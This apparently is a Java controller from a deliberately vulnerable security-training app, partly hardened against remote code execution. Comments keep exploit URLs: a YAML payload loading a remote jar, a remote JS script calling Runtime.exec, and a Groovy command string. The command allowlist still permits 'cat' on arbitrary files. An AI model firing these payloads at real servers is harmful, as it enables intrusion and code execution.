package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.List;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final List<String> ALLOWED_COMMANDS = Arrays.asList("ls", "whoami", "date", "uname", "id", "cat", "echo");

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        StringBuilder sb = new StringBuilder();

        try {
            String[] parts = cmd.split("\\s+");
            if (parts.length == 0 || !ALLOWED_COMMANDS.contains(parts[0])) {
                return "Command not allowed.";
            }
            ProcessBuilder processBuilder = new ProcessBuilder(parts);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        StringBuilder sb = new StringBuilder();

        try {
            String[] parts = cmd.split("\\s+");
            if (parts.length == 0 || !ALLOWED_COMMANDS.contains(parts[0])) {
                return "Command not allowed.";
            }
            ProcessBuilder processBuilder = new ProcessBuilder(parts);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    private static final List<String> ALLOWED_JS_HOSTS = Arrays.asList("cdn.example.com", "static.example.com");

    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // Validate jsurl against allowlist to prevent arbitrary script loading / RCE
        java.net.URI uri;
        try {
            uri = new java.net.URI(jsurl);
        } catch (Exception e) {
            throw new IllegalArgumentException("Invalid URL");
        }
        String host = uri.getHost();
        if (host == null || !ALLOWED_JS_HOSTS.contains(host.toLowerCase())) {
            throw new IllegalArgumentException("JS URL host not allowed: " + host);
        }
        if (!"https".equals(uri.getScheme())) {
            throw new IllegalArgumentException("Only HTTPS JS URLs are allowed");
        }
        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        // Remove Java class access from the script engine to prevent RCE
        bindings.remove("java");
        bindings.remove("javax");
        bindings.remove("Java");
        bindings.remove("Packages");
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        SecureASTCustomizer secureAst = new SecureASTCustomizer();
        // Deny all method calls, system exits, package access, and imports to prevent RCE
        secureAst.setMethodDefinitionAllowed(false);
        secureAst.setClosuresAllowed(false);
        secureAst.setPackageAllowed(false);
        secureAst.setIndirectImportCheckEnabled(true);
        secureAst.setImportsWhitelist(Arrays.asList("java.lang.Math", "java.lang.Integer", "java.lang.Double", "java.lang.String"));
        secureAst.setStarImportsWhitelist(java.util.Collections.emptyList());
        secureAst.setStaticImportsWhitelist(java.util.Collections.emptyList());
        secureAst.setStaticStarImportsWhitelist(java.util.Collections.emptyList());
        // Block dangerous receivers: Runtime, ProcessBuilder, System, Class, ClassLoader, Thread
        secureAst.setReceiversBlackList(Arrays.asList(
                "java.lang.Runtime", "java.lang.ProcessBuilder", "java.lang.System",
                "java.lang.Class", "java.lang.ClassLoader", "java.lang.Thread",
                "groovy.lang.GroovyShell", "groovy.lang.GroovyClassLoader",
                "java.io.File", "java.net.URL", "java.net.Socket"));

        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secureAst);
        GroovyShell groovyShell = new GroovyShell(config);
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

